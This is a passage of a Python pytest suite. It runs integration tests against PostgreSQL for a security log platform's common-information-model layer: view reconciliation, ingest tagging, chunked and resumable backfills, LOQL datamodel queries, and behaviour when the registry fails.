            "makes exactly one row possible, so anything else means the conflict was not "
            "taken at all")
        row = rows[0]
        assert row["registry_version"] == edited.version, (
            f"cim_meta.registry_version is {row['registry_version']} after a second stamp "
            f"with registry v{edited.version} (the first was v{real.version}). The row was "
            "NOT updated -- `ON CONFLICT (id) DO UPDATE` has become DO NOTHING, so the "
            "stamp is frozen at the first registry this database ever saw and /admin, "
            "/datamodels and /health all report it for ever")
        assert list(row["model_tags"]) == [m.tag for m in edited.models], (
            f"cim_meta.model_tags is {row['model_tags']}; the second registry declares "
            f"{[m.tag for m in edited.models]}, so `model_tags = EXCLUDED.model_tags` did "
            "not run")
        assert row["membership_hash"] == db.cim_membership_fingerprint(edited), (
            "cim_meta.membership_hash still fingerprints the FIRST registry. This is the "
            "column that says which membership rule the views were built from, and a "
            "stale one describes a database that no longer exists")
        assert row["applied_at"] > before["applied_at"], (
            f"applied_at did not move ({before['applied_at']} -> {row['applied_at']}); "
            "`applied_at = EXCLUDED.applied_at` is what dates the stamp on /admin, and "
            "two stamps are two transactions, so now() differs between them")
        assert (row["backfill_hash"] == before["backfill_hash"]
                and row["backfilled_at"] == before["backfilled_at"]), (
            f"the stamp moved the BACKFILL half of the row: backfill_hash "
            f"{before['backfill_hash']!r} -> {row['backfill_hash']!r}, backfilled_at "
            f"{before['backfilled_at']!r} -> {row['backfilled_at']!r}. Only `backfill_cim` "
            "may write those two -- they record which rule the STORED cim_models values "
            "were derived under, and `cim_status` compares backfill_hash against the "
            "registry on disk to answer `backfill_due`. A view rebuild that cleared them "
            "(a DELETE-then-INSERT spelling of the upsert does exactly that) would demand "
            "a pointless full-table backfill; one that ADVANCED them to the new registry "
            "would report history as current under a rule not one row has been derived "
            "under, which is the failure the whole stamp exists to make impossible")
    finally:
        # `edited` kept every real model, so nothing was dropped as an orphan -- but
        # `cim_stampprobe` was created and the stamp now names a registry that does not
        # exist on disk. This restores both.
        db.init_cim()
    assert "cim_stampprobe" not in _cim_views(db), (
        "the probe model's view outlived the test; init_cim did not reclaim it as an "
        "orphan and it would be counted by every later test that lists cim_* views")


def test_init_cim_drops_an_orphan_view_but_never_cascades(clean_db):
    """Reconciliation, and its deliberate limit.

    A model removed from models.yaml leaves its `cim_<tag>` view behind, still answering
    queries from a rule that no longer exists — so init_cim drops it. But it drops
    WITHOUT cascade: an operator may have built their own view on top of a model view,
    and deleting that silently at startup is worse than leaving a stale view. Three
    fixtures cover the three outcomes: a plain orphan (dropped), an orphan with a
    dependent (left alone, and the dependent survives), and a name outside the
    `cim_<tag>` shape (never touched, because we cannot prove we created it).
    """
    db = clean_db
    db.init_cim()
    with db.pool().connection() as conn:
        conn.execute("CREATE OR REPLACE VIEW cim_zzz AS SELECT 1 AS x")
        conn.execute("CREATE OR REPLACE VIEW cim_ghost AS SELECT 2 AS x")
        conn.execute("CREATE OR REPLACE VIEW analyst_pinned AS SELECT x FROM cim_ghost")
        conn.execute("CREATE OR REPLACE VIEW cimbogus AS SELECT 3 AS x")
        conn.commit()
    try:
        res = db.init_cim()
        present = _cim_views(db)
        with db.pool().connection() as conn:
            dependent = conn.execute(
                "SELECT viewname FROM pg_views WHERE schemaname = current_schema() "
                "AND viewname = 'analyst_pinned'").fetchone()

        assert "cim_zzz" in res["dropped"] and "cim_zzz" not in present, (
            f"the orphaned view cim_zzz survived init_cim. dropped={res['dropped']}, "
            f"views now={sorted(present)}")
        assert "cim_ghost" in present, (
            "cim_ghost was dropped despite another view depending on it -- the drop must "
            "be RESTRICT, never CASCADE")
        assert "cim_ghost" not in res["dropped"], (
            "init_cim reported cim_ghost as dropped, but a dependent object blocks the "
            "drop; reporting it dropped hides the failure from the operator")
        assert dependent is not None, (
            "analyst_pinned was destroyed. init_cim CASCADEd a drop and deleted an "
            "object the application does not own -- the exact outcome the RESTRICT "
            "policy exists to prevent")
        with db.pool().connection() as conn:
            bogus = conn.execute(
                "SELECT viewname FROM pg_views WHERE schemaname = current_schema() "
                "AND viewname = 'cimbogus'").fetchone()
        assert bogus is not None, (
            "cimbogus was dropped. It does not match `^cim_[a-z][a-z0-9_]*$`, so this "
            "module cannot have created it and must not delete it")
        assert {cim.view_name(m) for m in cim.get_registry().models} <= present, (
            "reconciliation dropped a view of a model that IS in the registry")
    finally:
        # Not left to clean_db: `analyst_pinned` and `cimbogus` fall outside the
        # `cim_<tag>` shape the fixture sweeps, so they would leak into later runs.
        with db.pool().connection() as conn:
            for name in ("analyst_pinned", "cimbogus", "cim_ghost", "cim_zzz"):
                conn.execute(f"DROP VIEW IF EXISTS {name} CASCADE")
            conn.commit()


def test_pipeline_ingest_stamps_cim_models(clean_db):
    """End to end through the real write path: `pipeline.write_stream` ->
    `db.insert_events` -> `db._row` -> `cim.match.cim_models_for`. This is the assertion
    that Backbone 2 is actually WIRED — every other CIM test could pass with `_row`
    never binding the column."""
    db = clean_db
    from app import pipeline
    with db.pool().connection() as conn:
        res = pipeline.write_stream(conn, [
            _win_auth("cim-e2e-logon"),
            _win_auth("cim-e2e-process", event_id=4688),
            _ot_write("cim-e2e-modbus-write"),
            _untagged("cim-e2e-unclassifiable"),
        ], batch_id=1)
        conn.commit()
    assert res.total == 4
    tags = _stored_tags(db)

    assert tags["cim-e2e-logon"] == ["authentication"], (
        f"a Windows 4625 stored {tags['cim-e2e-logon']!r}. Either db._row is not binding "
        "cim_models, or windows raw['event_id'] is not reaching the registry's "
        "membership term")
    assert tags["cim-e2e-process"] == ["endpoint"]
    assert tags["cim-e2e-modbus-write"] == ["ics", "network"], (
        f"a Modbus write stored {tags['cim-e2e-modbus-write']!r}; it belongs to TWO "
        "models and the tags are stored sorted, so ['ics', 'network'] is the only "
        "correct value. A single tag means array membership collapsed somewhere")
    assert tags["cim-e2e-unclassifiable"] is None, (
        f"an event in no model stored {tags['cim-e2e-unclassifiable']!r}; it must be SQL "
        "NULL, not '{}' -- insert_events and backfill_cim have to agree on the spelling "
        "or a backfilled row differs from a freshly ingested one for no visible reason")

    with db.pool().connection() as conn:
        hits = {r["message"] for r in conn.execute(
            "SELECT message FROM events WHERE cim_models @> ARRAY['network']::text[]"
        ).fetchall()}
    assert hits == {"cim-e2e-modbus-write"}, (
        f"the containment predicate found {hits}; the value stored by ingest and the "
        "predicate every reader uses disagree")


def test_backfill_cim_corrects_history_in_committed_chunks(clean_db):
    """`db.backfill_cim` is the operator step that fixes rows ingested under an older
    membership rule. It must correct wrong tags, fill absent ones, REMOVE tags a row no
    longer earns, page in bounded committed chunks, and be safe to run twice."""
    db = clean_db
    db.init_cim()                       # creates the cim_meta row the stamp updates

    expected = {}
    events = []

    def plan(evt, tags):
        """Queue an event and record the membership the backfill must end up with."""
        events.append(evt)
        expected[evt.message] = tags

    for i in range(3):                  # wrong tags -> replaced
        plan(_win_auth(f"cim-bf-wrong-{i}"), ["authentication"])
    for i in range(2):                  # absent tags -> filled, and multi-model
        plan(_ot_write(f"cim-bf-null-{i}"), ["ics", "network"])
    # a tag it does not earn -> cleared back to NULL
    plan(_untagged("cim-bf-overtagged"), None)
    for i in range(2):                  # already correct -> must not be rewritten
        plan(_win_auth(f"cim-bf-ok-{i}", event_id=4688), ["endpoint"])
    _store(db, events)

    with db.pool().connection() as conn:
        conn.execute("UPDATE events SET cim_models = ARRAY['wrongtag']::text[] "
                     "WHERE message LIKE %s", ("cim-bf-wrong-%",))
        conn.execute("UPDATE events SET cim_models = NULL "
                     "WHERE message LIKE %s", ("cim-bf-null-%",))
        conn.execute("UPDATE events SET cim_models = ARRAY['authentication']::text[] "
                     "WHERE message = %s", ("cim-bf-overtagged",))
        conn.commit()
    assert db.cim_status()["backfill_due"] is True, (
        "cim_status says history is current before any backfill has run; the stamp is "
        "written only by a completed full pass, so backfill_due must start True")

    res = db.backfill_cim(chunk=2)

    assert res["scanned"] == 8 and res["updated"] == 6 and res["unchanged"] == 2, (
        f"backfill counters are {res}. 8 rows exist, 6 were deliberately corrupted, 2 "
        "were already correct and must be recognised as unchanged and not rewritten")
    assert res["chunks"] == 4, (
        f"backfill ran in {res['chunks']} chunk(s) for 8 rows at chunk=2. It must page: "
        "one unbounded UPDATE over a three-year partitioned table holds a single "
        "transaction, its locks and its WAL open for the whole run and is not resumable")
    assert res["done"] is True and res["full_pass"] is True

    tags = _stored_tags(db)
    wrong = {k: (tags.get(k), v) for k, v in expected.items() if tags.get(k) != v}
    assert not wrong, (
        "backfill left these rows with the wrong membership, as "
        f"message -> (stored, expected): {wrong}")
    assert db.cim_status()["backfill_due"] is False, (
        "a completed unbounded backfill did not advance cim_meta.backfill_hash, so the "
        "UI will keep telling the operator a backfill is due after they ran one")

    again = db.backfill_cim(chunk=2)
    assert again["updated"] == 0 and again["unchanged"] == 8, (
        f"a second identical backfill rewrote rows: {again}. Rows whose tags are "
        "unchanged must not be written at all, or a re-run rewrites every heap tuple")
    assert _stored_tags(db) == tags


def test_backfill_cim_stops_on_max_rows_and_resumes_from_last_id(clean_db):
    """A bounded run keeps what it did, refuses to claim it finished, and hands back a
    cursor the operator can resume from.

    IT DOES NOT PIN THE PER-CHUNK COMMIT, and it used to say it did. `backfill_cim` runs
    inside `with pool().connection() as conn:`, and that context manager commits on a
    clean exit, so everything below is equally true of a run that committed once at the
    end. The property lives in
    `test_backfill_cim_commits_every_chunk_before_starting_the_next`, which observes it
    mid-run from a second connection because that is the only place it is observable.
    """
    db = clean_db
    db.init_cim()
    _store(db, [_win_auth(f"cim-resume-{i}") for i in range(6)])
    with db.pool().connection() as conn:
        conn.execute("UPDATE events SET cim_models = NULL")
        conn.commit()

    first = db.backfill_cim(chunk=2, max_rows=2)
    assert first["scanned"] == 2 and first["updated"] == 2
    assert first["done"] is False, (
        "a run stopped by its own max_rows bound reported done=True; the caller cannot "
        "then tell 'the table is finished' from 'I ran out of budget'")
    assert first["full_pass"] is False

    corrected = [v for v in _stored_tags(db).values() if v is not None]
    assert len(corrected) == 2, (
        f"{len(corrected)} of 6 rows are corrected after a max_rows=2 run. A bounded run "
        "must KEEP the work it did and touch nothing beyond its budget -- more than 2 "
        "means max_rows did not bound the pass, fewer means a stopped run threw its own "
        "work away")
    assert db.cim_status()["backfill_due"] is True, (
        "a bounded partial run advanced the backfill stamp, which tells the operator "
        "history is current when most of it has not been touched")

    rest = db.backfill_cim(chunk=10, start_id=first["last_id"])
    assert rest["scanned"] == 4 and rest["updated"] == 4, (
        f"resuming at start_id={first['last_id']} scanned {rest['scanned']} rows; the "
        "keyset cursor should have skipped exactly the 2 already-corrected rows")
    assert all(v == ["authentication"] for v in _stored_tags(db).values())
    assert db.cim_status()["backfill_due"] is True, (
        "a run started at a non-zero start_id advanced the stamp; only an unbounded pass "
        "from the beginning has actually seen every row")
    db.backfill_cim()
    assert db.cim_status()["backfill_due"] is False


def test_backfill_cim_commits_every_chunk_before_starting_the_next(clean_db):
    """The per-chunk COMMIT, observed from OUTSIDE the backfill's transaction.

    This is the property that makes a chunked backfill worth writing, and it is invisible
    to every other test in this file. `backfill_cim` runs inside
    `with pool().connection() as conn:`, and psycopg_pool's context manager COMMITS on a
    clean exit — so deleting the `conn.commit()` at the end of the chunk loop changes
    nothing any of the other backfill tests can see. They inspect the store after the call
    returns, by which time one big transaction and eight small ones have produced the same
    rows. What is silently lost is everything the docstring promises: one transaction, its
    row locks and its WAL held open across a three-year partitioned table, an interrupted
    run that loses all of its work instead of one chunk, and a `last_id` that is not a
    resume cursor because the rows behind it were never durable.

    So the assertion has to be made from a SECOND connection, while the run is in flight.
    A `progress` sink fires after each committed chunk; from inside it a separate pooled
    connection counts the corrected rows. Under READ COMMITTED that connection can only
    see what has actually been committed, so:

      * per-chunk commit present -> it sees 2, then 4, then 6;
      * `conn.commit()` deleted   -> it sees 0, 0, 0 (the writes are still in the
        backfill's open transaction) and this test fails;
      * `progress` moved BEFORE the commit -> it sees 0, 2, 4 and this test fails, which
        is right too: `last_id` is only a valid resume cursor once the work up to it is
        durable, and publishing it earlier invites an operator to resume past uncommitted
        rows.

    A plain SELECT never blocks on an uncommitted writer in PostgreSQL's MVCC, so the
    observer cannot deadlock with the run it is watching; the pool allows 10 connections,
    so it cannot starve it either.
    """
    db = clean_db
    db.init_cim()
    _store(db, [_win_auth(f"cim-commit-{i}") for i in range(6)])
    with db.pool().connection() as conn:
        conn.execute("UPDATE events SET cim_models = NULL")
        conn.commit()
    assert _stored_tags(db) == {f"cim-commit-{i}": None for i in range(6)}, (
        "the six rows were not reset to NULL, so 'corrected so far' does not mean "
        "anything below")

    seen: list[tuple[int, int, int]] = []

    def observe(snapshot):
        """(scanned, updated, rows another connection can SEE corrected) per chunk."""
        with db.pool().connection() as other:
            visible = other.execute(
                "SELECT count(*) AS n FROM events WHERE cim_models IS NOT NULL"
            ).fetchone()["n"]
        seen.append((snapshot["scanned"], snapshot["updated"], visible))

    res = db.backfill_cim(chunk=2, progress=observe)

    assert res["chunks"] == 3 and len(seen) == 3, (
        f"6 rows at chunk=2 ran in {res['chunks']} chunk(s) and published {len(seen)} "
        "snapshot(s); without one snapshot per chunk there is nothing to observe from")
    assert seen == [(2, 2, 2), (4, 4, 4), (6, 6, 6)], (
        "a second connection could not see the work of the chunks that had already "
        "finished, as (scanned, updated, visible-from-another-connection): "
        f"{seen}. All-zero `visible` means the per-chunk `conn.commit()` in "
        "db.backfill_cim is gone and the whole pass is ONE transaction -- one lock set "
        "and one WAL segment chain held for the entire run over three years of "
        "partitions, and an interrupted run that loses everything rather than one chunk. "
        "A `visible` that lags `updated` by exactly one chunk means progress is being "
        "published before the commit instead of after it; a `visible` that lags it by "
        "less than a whole chunk means a chunk committed only part of its writes")
    assert res["updated"] == 6 and res["done"] is True
    assert all(v == ["authentication"] for v in _stored_tags(db).values())


def test_loql_datamodel_query_executes_against_postgres(clean_db):
    """The test that proves the LOQL CIM compiler emits VALID SQL, not merely plausible
    SQL. Everything upstream of `run.py` is string assembly checked by unit tests; this
    is the only place PostgreSQL ever parses it."""
    db = clean_db
    from app.loql import run_query
    _store(db, [_win_auth("cim-loql-logon"), _ot_write("cim-loql-modbus"),
                _untagged("cim-loql-other")])

    res = run_query("| datamodel Authentication", limit=50)
    assert res["count"] == 1, (
        f"`| datamodel Authentication` returned {res['count']} rows over 3 events, one "
        "of which is an authentication event. The membership predicate or the tags "
        "stored at ingest are wrong")
    row = res["rows"][0]
    assert row["message"] == "cim-loql-logon"
    assert row["user"] == "jdoe", (
        f"the CIM field `user` came back as {row.get('user')!r}. It is `user_name AS "
        '"user"` -- an UNQUOTED `user` label parses as CURRENT_USER and returns the '
        "database login on every row, which is why the label is double-quoted")
    assert row["src"] == "10.0.0.7", (
        f"`src` is {row.get('src')!r}; it is host(src_ip), so an inet must render as a "
        "bare address with no prefix length")
    assert row["vendor_product"] == "microsoft:windows"

    agg = run_query("from datamodel:Industrial | stats count by protocol", limit=50)
    assert agg["fields"] == ["protocol", "count"]
    assert agg["rows"] == [{"protocol": "modbus", "count": 1}], (
        f"the Industrial aggregate returned {agg['rows']}. `protocol` is "
        "`raw #>> ARRAY['ot','protocol']`, so this also proves the nested jsonb path "
        "the OT model depends on resolves in real SQL")


def test_cim_view_and_loql_datamodel_project_the_same_columns(clean_db):
    """`| datamodel X` and `SELECT * FROM cim_x` are documented to return one shape, and
    they are built by two independent emitters (`cim.sql.create_view_ddl` and the LOQL
    compiler's `_cim_select`). This walks the live registry, so a model added to
    models.yaml is covered with no test edit — and it executes every model's LOQL path,
    which is eleven more compiled queries PostgreSQL has to accept.

    LOQL drops `raw` from the FINAL projection (it is carried through the CTEs so
    schema-on-read still works on unmapped keys, but it is not a result column); that
    single documented difference is subtracted here rather than hidden.
    """
    db = clean_db
    db.init_cim()
    from app.loql import run_query
    drift = []
    for m in cim.get_registry().models:
        want = [c for c in _view_columns(db, cim.view_name(m)) if c != "raw"]
        loql_cols = run_query(f"| datamodel {m.tag}", limit=1)["fields"]
        if loql_cols != want:
            drift.append(f"{m.name} ({m.tag})\n    view: {want}\n    loql: {loql_cols}")
    assert not drift, (
        "the CIM view and the LOQL datamodel projection have drifted apart, so "
        "`| datamodel X` and `SELECT * FROM cim_x` no longer return the same shape:\n"
        + "\n".join(drift))


# --------------------------------------------------------------------------- #
#  CIM failure modes: a broken registry, a pinned view, an interrupted run     #
# --------------------------------------------------------------------------- #
# The section above proves the CIM layer works. This one proves it fails the way it
# claims to, which is where the design was actually wrong: a malformed models.yaml used
# to raise inside `db._row`, and `streaming._flush` answers an exception from the write
# by counting a flush error and DISCARDING the buffered batch — so a YAML typo silently
# deleted every live-ingested event while /health still said "ok". None of this had ever
# executed against a database.


def test_a_broken_registry_stores_the_event_untagged_instead_of_discarding_it(
        clean_db, monkeypatch):
    """THE rule of the ingest path: no code path may silently discard an event.

    `db._cim_tags` catches an unusable registry, stores the row with `cim_models` NULL
    and records the failure. The tags are recoverable — the second half of this test
    recovers them with the very command /health tells the operator to run — whereas a
    dropped event is gone from a system whose entire purpose is not to lose events.

    `cim_models_for` is patched rather than models.yaml, because the point is what the
    WRITE PATH does when membership evaluation raises, whatever made it raise.

    THE DOUBLE MUST TAKE `tags`, and keyword-only, exactly as the real
    `cim.match.cim_models_for(evt, registry=None, *, tags=None)` does. `db._cim_tags`
    calls it as `cim_models_for(evt, tags=tags)`, so a double without that parameter
    raises TypeError instead of CimError — which `_cim_tags` catches just the same, so the
    events still land untagged and only the `"CimError" in state["error"]` assertion
    below notices. That is the shape of the bug this whole file exists to catch: a test
    that fails for a reason that has nothing to do with the code under it.
    """
    db = clean_db
    from app.cim import CimError

    def boom(evt, registry=None, *, tags=None):
        raise CimError("membership term 'log_type' needs at least one value")

    db.reset_cim_write_state()
    monkeypatch.setattr(db, "cim_models_for", boom)
    try:
        _store(db, [_win_auth("cim-degraded-logon"), _ot_write("cim-degraded-modbus")])

        tags = _stored_tags(db)
        assert set(tags) == {"cim-degraded-logon", "cim-degraded-modbus"}, (
            f"the store holds {sorted(tags)} after a registry failure during insert. "
            "Both events must be THERE: a registry defect may cost the CIM tags and "
            "must never cost the event, because the caller that would see the exception "
            "(streaming._flush) responds by throwing the whole buffered batch away")
        assert all(v is None for v in tags.values()), (
            f"stored tags are {tags}; an event whose membership could not be evaluated "
            "must store SQL NULL, the same spelling as an event that belongs to no "
            "model, so the GIN index and backfill_cim both behave normally")

        state = db.cim_write_state()
        assert state["failures"] == 2, (
            f"cim_write_state counted {state['failures']} failures for 2 events. It "
            "counts EVENTS stored untagged, and it is what /health surfaces -- an "
            "under-count is how this becomes invisible again")
        assert "CimError" in (state["error"] or ""), (
            f"the recorded error is {state['error']!r}; it must name the failure so "
            "/health and the log point at the registry rather than at the database")
        assert state["since"] is not None
    finally:
        monkeypatch.undo()
        db.reset_cim_write_state()

    # ... and the damage is repairable, which is the whole argument for storing over
    # discarding. This is the exact command the /health message tells the operator to run.
    db.init_cim()                        # the cim_meta row backfill_cim stamps
    res = db.backfill_cim()
    assert res["updated"] == 2, (
        f"the backfill corrected {res['updated']} of the 2 untagged rows: {res}")
    assert _stored_tags(db) == {"cim-degraded-logon": ["authentication"],
                                "cim-degraded-modbus": ["ics", "network"]}, (
        "a row stored untagged during the outage did not come back with exactly the tags "
        "a freshly ingested one would carry, so the recovery story is not real")
    assert db.cim_write_state()["failures"] == 0


def test_init_cim_rebuilds_every_other_view_when_one_is_pinned_by_an_operator_object(
        clean_db):
    """One analyst's view must not freeze the whole CIM rebuild — permanently.

    docs/CIM.md presents `cim_<tag>` as the query surface, so `CREATE VIEW my_logons AS
    SELECT * FROM cim_authentication` is the documented thing to do. With the DDL applied
    in ONE transaction, the next startup's `DROP VIEW cim_authentication` failed with
    SQLSTATE 2BP01, the transaction rolled back and NONE of the eleven views refreshed —
    on that startup and on every startup after it, because the analyst's view is still
    there. Each model now has its own transaction.

    The collateral view is dropped first so "the others refreshed" is provable rather
    than merely likely: under the old all-or-nothing behaviour it stays missing.
    """
    db = clean_db
    reg = cim.get_registry()
    pinned, collateral = reg.models[0], reg.models[-1]
    pinned_view, collateral_view = cim.view_name(pinned), cim.view_name(collateral)
    assert pinned_view != collateral_view, "the registry needs >1 model for this test"

    db.init_cim()
    with db.pool().connection() as conn:
        conn.execute(f"CREATE VIEW analyst_pinned AS SELECT id FROM {pinned_view}")
        conn.execute(f"DROP VIEW {collateral_view}")
        conn.commit()
    try:
        res = db.init_cim()
        present = _cim_views(db)

        assert collateral_view in present, (
            f"{collateral_view} was not recreated. Its DDL is fine; it failed only "
            f"because {pinned_view} could not be dropped in the same transaction. That "
            "is the permanent, silent outage this per-model transaction exists to stop")
        assert collateral_view in res["views"], (
            f"init_cim reported views {res['views']}, which does not include the one it "
            "just rebuilt")
        assert [f["view"] for f in res["failed"]] == [pinned_view], (
            f"init_cim reported failed={res['failed']}; exactly one model is blocked "
            f"({pinned_view}, by analyst_pinned) and the operator has to be told which")
        assert res["failed"][0]["error"], (
            "the failure was reported with an empty message, so nobody can tell a "
            "dependent object (their problem) from a bad field expression (ours)")
        assert pinned_view not in res["views"], (
            f"{pinned_view} is reported as rebuilt although its DROP failed; it still "
            "holds its OLD definition, and saying otherwise hides a stale view")
        assert pinned_view in present, (
            f"{pinned_view} is gone. A blocked drop must leave the existing view in "
            "place, not remove it")

        with db.pool().connection() as conn:
            dependent = conn.execute(
                "SELECT viewname FROM pg_views WHERE schemaname = current_schema() "
                "AND viewname = 'analyst_pinned'").fetchone()
        assert dependent is not None, (
            "analyst_pinned was destroyed: the rebuild CASCADEd. Resilience must never "
            "be bought by deleting an object the application does not own")

        assert {cim.view_name(m) for m in reg.models} - {pinned_view} <= present, (
            f"models other than the pinned one are missing their views: "
            f"{sorted({cim.view_name(m) for m in reg.models} - present)}")
    finally:
        with db.pool().connection() as conn:
            conn.execute("DROP VIEW IF EXISTS analyst_pinned")
            conn.commit()
        db.init_cim()                    # leave every view rebuilt for the next test


def test_backfill_cim_publishes_the_resume_cursor_after_every_committed_chunk(clean_db):
    """`progress` exists so the resume cursor is visible DURING the run.

    `main`'s shutdown handler prints "resume with db.backfill_cim(start_id=%s)" while a
    pass is in flight, and it read the run's RESULT — which is None until the run
    returns — so it printed 0 every time, i.e. "redo the whole table", the exact opposite
    of what it is for. Each snapshot is published after its chunk COMMITS, so acting on
    the last one can never re-do committed work or skip uncommitted work.
    """
    db = clean_db
    db.init_cim()
    _store(db, [_win_auth(f"cim-progress-{i}") for i in range(5)])
    with db.pool().connection() as conn:
        conn.execute("UPDATE events SET cim_models = NULL")
        conn.commit()

    seen: list[dict] = []
    res = db.backfill_cim(chunk=2, progress=seen.append)

    assert res["chunks"] == 3 and len(seen) == 3, (
        f"5 rows at chunk=2 ran in {res['chunks']} chunk(s) and published {len(seen)} "
        "snapshot(s); one snapshot per committed chunk is the contract")
    ids = [s["last_id"] for s in seen]
    assert ids == sorted(ids) and len(set(ids)) == 3, (
        f"published last_id values {ids} are not strictly increasing, so they are not "
        "keyset cursors and resuming from one would repeat or skip rows")
    assert seen[-1]["last_id"] == res["last_id"], (
        f"the last published cursor ({seen[-1]['last_id']}) disagrees with the returned "
        f"one ({res['last_id']}); an operator reading the log would resume elsewhere")
    assert [s["scanned"] for s in seen] == [2, 4, 5], (
        f"published scanned counts are {[s['scanned'] for s in seen]}; they are the "
        "running totals of a pass, not per-chunk deltas")

    # Resuming from a mid-run snapshot must land exactly where it says it did.
    with db.pool().connection() as conn:
        conn.execute("UPDATE events SET cim_models = NULL")
        conn.commit()
    resumed = db.backfill_cim(chunk=10, start_id=seen[0]["last_id"])
    assert resumed["scanned"] == 3, (
        f"resuming at the first published cursor scanned {resumed['scanned']} of the 3 "
        "rows beyond it, so the published value is not the cursor it claims to be")
    # Read back which rows the resumed run actually touched, keyed on id rather than on
    # the counter the run reported about itself: `scanned` is `backfill_cim`'s own
    # arithmetic, and a run that ignored `start_id` and then subtracted it from the total
    # would report 3 while having rewritten all five rows.
    with db.pool().connection() as conn:
        rows = conn.execute("SELECT id, cim_models FROM events ORDER BY id").fetchall()
    at_or_before = [r["cim_models"] for r in rows if r["id"] <= seen[0]["last_id"]]
    beyond = [r["cim_models"] for r in rows if r["id"] > seen[0]["last_id"]]
    assert beyond == [["authentication"]] * 3, (
        f"the rows past the published cursor are {beyond}; resuming from a snapshot must "
        "correct every row beyond it")
    assert at_or_before == [None, None], (
        f"the rows AT OR BEFORE the published cursor are {at_or_before}, not NULL. The "
        "keyset predicate is `id > %(_after)s`; an `id >= ` or an ignored `start_id` "
        "re-does work the operator was told was already durable, which is the one thing a "
        "resume cursor must not do")

    calls: list[dict] = []

    def hostile(snapshot):
        calls.append(snapshot)
        raise RuntimeError("a progress sink must never be able to kill a backfill")

    again = db.backfill_cim(chunk=2, progress=hostile)
    assert again["scanned"] == 5 and len(calls) == 3, (
        f"a raising progress callback stopped the run after {again['scanned']} rows. "
        "Progress reporting is diagnostics; it must never abort the work it describes")


def test_insert_events_stores_the_tags_the_pipeline_resolved(clean_db):
    """The resolved-tags hand-off, against a real database.

    `pipeline.write_stream` resolves CIM membership once per event and threads it into
    `insert_events(cim_tags=...)` so the registry is walked once instead of twice. Every
    unit test of that path binds against a fake cursor, so THIS is the only place the
    threaded array is proved to survive psycopg's `text[]` binding and come back out of
    PostgreSQL as the same value a self-derived row would have.
    """
    db = clean_db
    db.init_cim()
    threaded = _win_auth("cim-thread-supplied")          # 4625 -> ['authentication']
    derived = _win_auth("cim-thread-derived")
    unresolved = _win_auth("cim-thread-unresolved", event_id=4688)   # -> ['endpoint']

    with db.pool().connection() as conn:
        # index-aligned: a real value, a deliberately WRONG-but-valid value, and None
        db.insert_events(conn, [threaded, derived, unresolved], 1,
                         cim_tags=[frozenset({"authentication"}), frozenset({"web"}),
                                   None])
        conn.commit()

    tags = _stored_tags(db)
    assert tags["cim-thread-supplied"] == ["authentication"], (
        f"threaded tags did not reach the column: {tags['cim-thread-supplied']!r}")
    assert tags["cim-thread-derived"] == ["web"], (
        "the threaded value was ignored and membership re-derived. The whole point of "
        "the hand-off is that the caller's value is USED — a deliberately wrong value is "
        "how that is told apart from a coincidentally equal one")
    assert tags["cim-thread-unresolved"] == ["endpoint"], (
        "a None entry means 'unresolved, derive this one'; it must not be stored as NULL")


def test_insert_events_refuses_a_misaligned_tag_list(clean_db):
    """A shifted list would tag every row with its neighbour's models — invisible in the
    stored data and indistinguishable from a membership bug."""
    db = clean_db
    with db.pool().connection() as conn:
        with pytest.raises(ValueError, match="index-aligned"):
            db.insert_events(conn, [_win_auth("a"), _win_auth("b")], 1,
                             cim_tags=[frozenset({"authentication"})])


def test_cim_status_separates_restart_required_from_backfill_due(clean_db, monkeypatch):
    """`get_registry()` caches for the process lifetime, so between an operator's edit and
    the restart the live rule and the file on disk are two different things — and that
    window used to read as green on /admin.

    Worse, `backfill_due` was measured against the CACHED registry, so a backfill run in
    that window re-derived under the old rule and then stamped `backfill_hash` with the
    old fingerprint, turning `backfill_due` False. History was reported current under a
    rule that had never been applied to a single row. It is measured against the FILE now,
    so it stays True until restart-then-backfill has actually happened.

    CLEANS UP AFTER ITSELF, and the `finally` is not boilerplate. `registry_drift`
    memoizes `(content sha256 of models.yaml, membership fingerprint)` in
    `db._registry_disk_cache`. This test swaps the LOADER while the FILE is untouched, so
    the entry it leaves behind maps the REAL file's content hash to the FABRICATED
    registry's fingerprint — and `monkeypatch.undo()` cannot see it. Every later test that
    calls `cim_status` would then measure `backfill_due` against a registry that exists
    only here (`test_backfill_cim_corrects_history_in_committed_chunks` asserts
    `backfill_due is False`, and would fail), with the outcome depending on file order.
    """
    db = clean_db
    db.init_cim()
    _store(db, [_win_auth("cim-drift-1")])
    db.backfill_cim()                                    # history is current...
    clean = db.cim_status()
    assert clean["backfill_due"] is False and clean["restart_required"] is False, (
        f"a freshly backfilled store is not reported current: {clean}")

    # ...now the operator edits models.yaml, and has NOT restarted.
    edited = CimRegistry(version=99, models=(CimModel(
        name="Drifted", tag="drifted", version=1, description="",
        clauses=(CimClause(terms=(CimTerm(source=CimSource.column_of("vendor"),
                                          values=("microsoft",), label="v"),)),),
        fields=(CimField(name="user", source=CimSource.column_of("user_name")),)),))
    try:
        monkeypatch.setattr(db, "load_registry", lambda *a, **k: edited)
        db.reset_registry_disk_cache()      # the loader was swapped, not the file

        drifted = db.cim_status()
        assert drifted["restart_required"] is True, (
            "models.yaml changed and cim_status did not notice; the operator is told "
            "everything is current while the running process serves the old rule")
        assert drifted["backfill_due"] is True, (
            "backfill_due is measured against the cached registry again, so the edit is "
            "invisible until a restart — which is exactly how a backfill gets run under "
            "the old rule and then reports history as current")

        # a backfill in this window must NOT be able to claim history is current
        db.backfill_cim()
        assert db.cim_status()["backfill_due"] is True, (
            "a backfill run before the restart advanced the stamp. It re-derived every "
            "row under the OLD cached rule, so the stamp now claims a rule that has "
            "never been applied to a single row")
    finally:
        monkeypatch.undo()                  # restore db.load_registry FIRST ...
        db.reset_registry_disk_cache()      # ... then evict the entry it poisoned

    # Asserted outside the `finally` so a failure in the body is not replaced by this one.
    assert db.registry_drift()["restart_required"] is False, (
        "this test left db._registry_disk_cache holding the fabricated registry's "
        "fingerprint against the real file's content hash, so every later test that reads "
        "cim_status would see a drift that does not exist")


def test_cim_status_survives_an_unreadable_registry_file(clean_db, monkeypatch):
    """/admin is where an operator is told the file is broken, so reading it must degrade
    into a message rather than take the page down.

    The error path is deliberately NOT memoized by `registry_drift`, so unlike the drift
    test above this one cannot poison `db._registry_disk_cache` — the cache is only
    written after a SUCCESSFUL parse. The `finally` states that rather than relying on it:
    if the memoization ever moves ahead of the `try`, a stale "permission denied" would
    start leaking into every later cim_status, and the assertion below says so here.
    """
    db = clean_db
    db.init_cim()

    def unreadable(*a, **k):                # matches db.load_registry(path=...)
        raise OSError("models.yaml: permission denied")

